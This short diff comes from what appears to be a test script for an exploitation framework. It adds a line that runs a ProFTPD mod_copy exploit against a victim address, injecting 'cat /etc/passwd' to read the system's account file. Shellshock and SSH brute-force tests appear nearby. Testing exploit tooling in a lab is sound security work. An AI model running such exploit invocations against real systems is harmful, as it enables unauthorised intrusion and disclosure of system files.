@@ -78,6 +78,7 @@ checkPort 80 $ETHSPLOITER_PATH/exploits/multi/shellshock/shellshock_mod_cgi_bash
 
 testInfo "proftpd_modcopy_exec"
 checkPort "21\n80" python3 $ETHSPLOITER_PATH/exploits/unix/ftp/proftpd_modcopy_exec/exploit.py --host $VICTIM_ADDRESS --port 21 --path /var/www/html --cmd \"cat /etc/passwd\"
+checkPort "21\n80" python3 $ETHSPLOITER_PATH/exploits/unix/ftp/proftpd_modcopy_exec/exploit.py --host $VICTIM_ADDRESS --port 21 --path /var/www --cmd \"cat /etc/passwd\"
 
 #multi
 testInfo "ssh_brute_force"
